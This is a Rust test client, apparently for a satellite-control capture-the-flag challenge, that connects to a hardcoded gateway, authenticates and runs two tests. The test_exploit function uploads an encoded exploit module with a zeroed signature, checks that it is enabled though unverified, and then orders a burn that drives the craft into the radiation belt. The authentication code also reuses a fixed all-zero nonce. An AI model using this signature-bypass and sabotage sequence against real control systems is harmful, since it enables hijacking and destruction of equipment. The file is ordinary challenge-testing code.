//! Test client.

use anyhow::{anyhow, Result};
use chrono::Utc;
use rad_message::*;
use ring::aead::{Aad, LessSafeKey, Nonce, UnboundKey, CHACHA20_POLY1305};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

// const TEST_GW_ADDR: &str = "127.0.0.1:1337";
const TEST_GW_ADDR: &str = "165.22.0.163:1337";
const RAD_AUTH_KEY: &[u8] = include_bytes!("../../data/rad_auth_key");

#[test]
fn test_exploit() {
    tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap()
        .block_on(async {
            if let Err(e) = do_test_exploit().await {
                panic!("{}", e);
            }
        });
}

const ENCODED_EXPLOIT: &[u8] = include_bytes!("../../data/encoded_exploit");

async fn do_test_exploit() -> Result<()> {
    let timeout_duration = Duration::from_secs(10);
    let mut control = TcpStream::connect(TEST_GW_ADDR).await?;

    // Authenticate
    authenticate(&mut control).await?;

    // Send the exploit payload
    for i in 0..4 {
        let request = ControlRequest::UpdateModule {
            id: i,
            module: ENCODED_EXPLOIT.to_owned(),
            signature: vec![0x00; 64],
            encoded: true,
        };
        let response = timeout(timeout_duration, send(&mut control, request)).await??;
        if let ControlResponse::UpdateModule {
            success,
            verified,
            enabled,
            ..
        } = response
        {
            assert!(!success);
            assert!(!verified);
            assert!(enabled);
        } else {
            panic!("expected update module response");
        }
    }

    // Maneuver the craft into the inner radiation belt
    let now = Utc::now();
    let request = ControlRequest::Maneuver {
        burns: vec![Burn {
            start: now.timestamp() as _,
            length: 255,
            thrust: 1.0,
            vector: (-1.0, 0.0, 0.0),
        }],
    };
    let _response = timeout(timeout_duration, send(&mut control, request)).await??;

    // Disconnect
    let _response = timeout(
        timeout_duration,
        send(&mut control, ControlRequest::Disconnect),
    )
    .await??;
    Ok(())
}

#[test]
fn test_observe() {
    tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap()
        .block_on(async {
            if let Err(e) = do_test_observe().await {
                panic!("{}", e);
            }
        });
}

async fn do_test_observe() -> Result<()> {
    let timeout_duration = Duration::from_secs(10);
    let mut control = TcpStream::connect(TEST_GW_ADDR).await?;

    // Authenticate
    authenticate(&mut control).await?;

    // Send some observation requests
    let response = timeout(timeout_duration, send(&mut control, ControlRequest::NoOp)).await??;
    assert_eq!(response, ControlResponse::NoOp);
    let response = timeout(
        timeout_duration,
        send(&mut control, ControlRequest::Firmware),
    )
    .await??;
    match response {
        ControlResponse::Firmware { success, .. } => {
            assert!(success);
        }
        _ => panic!("expected status response"),
    }

    let response = timeout(
        timeout_duration,
        send(&mut control, ControlRequest::PositionVelocity),
    )
    .await??;
    match response {
        ControlResponse::PositionVelocity { success, .. } => {
            assert!(success);
        }
        _ => panic!("expected position and velocity response"),
    }

    let response = timeout(
        timeout_duration,
        send(&mut control, ControlRequest::KeplerianElements),
    )
    .await??;
    match response {
        ControlResponse::KeplerianElements { success, .. } => {
            assert!(success);
        }
        _ => panic!("expected keplerian elements response"),
    }

    for i in 0..4 {
        let response = timeout(
            timeout_duration,
            send(
                &mut control,
                ControlRequest::EnableModule {
                    id: i,
                    enable: true,
                },
            ),
        )
        .await??;
        match response {
            ControlResponse::EnableModule { success } => {
                assert!(success);
            }
            _ => panic!("expected enable module response"),
        }
    }

    // Disconnect
    let response = timeout(
        timeout_duration,
        send(&mut control, ControlRequest::Disconnect),
    )
    .await??;
    assert_eq!(response, ControlResponse::Disconnect);
    Ok(())
}

async fn authenticate(socket: &mut TcpStream) -> Result<()> {
    let timeout_duration = Duration::from_secs(5);
    let auth_key = UnboundKey::new(&CHACHA20_POLY1305, &RAD_AUTH_KEY)
        .map_err(|_| anyhow!("create auth key"))?;
    let auth_key = LessSafeKey::new(auth_key);
    let nonce = Nonce::assume_unique_for_key([0u8; 12]);
    let mut token = TEST_TOKEN.as_bytes().to_vec();
    auth_key.seal_in_place_append_tag(nonce, Aad::empty(), &mut token)?;
    let nonce = Nonce::assume_unique_for_key([0u8; 12]);
    let request = ControlRequest::Authenticate {
        token,
        nonce: nonce.as_ref().to_vec(),
    };
    match timeout(timeout_duration, send(socket, request)).await?? {
        ControlResponse::Authenticate {
            authenticated,
            connected,
        } => {
            assert!(authenticated);
            assert!(connected);
        }
        _ => panic!("expected authentication response"),
    }
    Ok(())
}

async fn send(socket: &mut TcpStream, request: ControlRequest) -> Result<ControlResponse> {
    let buffer = bincode::serialize(&request)?;
    socket.write_u32(buffer.len() as _).await?;
    socket.write_all(&buffer).await?;
    let size = socket.read_u32().await?;
    let mut buffer = vec![0u8; size as _];
    socket.read_exact(&mut buffer).await?;
    let response = bincode::deserialize(&buffer)?;
    Ok(response)
}
